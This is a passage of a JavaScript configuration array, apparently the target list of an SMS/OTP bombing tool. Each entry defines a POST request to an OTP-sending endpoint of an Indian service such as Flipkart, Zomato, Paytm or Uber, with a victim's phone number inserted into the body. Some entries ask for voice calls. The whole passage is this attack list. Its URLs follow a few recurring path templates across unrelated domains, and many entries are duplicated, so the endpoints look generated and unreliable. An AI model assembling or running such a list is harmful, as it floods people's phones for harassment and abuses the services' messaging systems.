  { 'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Phonepe SMS', 'url': 'https://phonepe.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Zivame SMS', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Tatacapital WhatsApp', 'url': 'https://tatacapital.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Amazon Call', 'url': 'https://amazon.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Flipkart SMS', 'url': 'https://flipkart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Meesho SMS', 'url': 'https://meesho.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Swiggy Call', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zivame Call', 'url': 'https://zivame.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': '1Mg SMS', 'url': 'https://1mg.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Jupiter Call', 'url': 'https://jupiter.money/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Myntra Call', 'url': 'https://myntra.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Instamart WhatsApp', 'url': 'https://instamart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Uber Call', 'url': 'https://uber.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Khatabook SMS', 'url': 'https://khatabook.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Newme Call', 'url': 'https://newme.asia/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Tatacapital WhatsApp', 'url': 'https://tatacapital.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Gokwik SMS', 'url': 'https://gokwik.co/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Zomato Call', 'url': 'https://zomato.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Uber SMS', 'url': 'https://uber.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Meesho SMS', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Meesho SMS', 'url': 'https://meesho.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Khatabook Call', 'url': 'https://khatabook.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Pokerbaazi WhatsApp', 'url': 'https://pokerbaazi.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Amazon SMS', 'url': 'https://amazon.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Paytm SMS', 'url': 'https://paytm.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Dmart Call', 'url': 'https://dmart.ready.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Uber SMS', 'url': 'https://uber.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Rapido SMS', 'url': 'https://rapido.bike/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Cred Call', 'url': 'https://cred.club/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Nykaa Call', 'url': 'https://nykaa.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Wakefit Call', 'url': 'https://wakefit.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Zepto SMS', 'url': 'https://zepto.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Newme WhatsApp', 'url': 'https://newme.asia/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Swiggy SMS', 'url': 'https://swiggy.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Newme Call', 'url': 'https://newme.asia/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Tatacapital WhatsApp', 'url': 'https://tatacapital.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Swiggy SMS', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Uber Call', 'url': 'https://uber.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Blinkit Call', 'url': 'https://blinkit.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Rapido SMS', 'url': 'https://rapido.bike/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Ajio Call', 'url': 'https://ajio.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Newme SMS', 'url': 'https://newme.asia/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Newme SMS', 'url': 'https://newme.asia/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Amazon Call', 'url': 'https://amazon.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Nykaa SMS', 'url': 'https://nykaa.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': '1Mg WhatsApp', 'url': 'https://1mg.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Jupiter Call', 'url': 'https://jupiter.money/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Cred SMS', 'url': 'https://cred.club/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Uber Call', 'url': 'https://uber.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Instamart WhatsApp', 'url': 'https://instamart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Zepto Call', 'url': 'https://zepto.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Instamart WhatsApp', 'url': 'https://instamart.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Wakefit SMS', 'url': 'https://wakefit.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
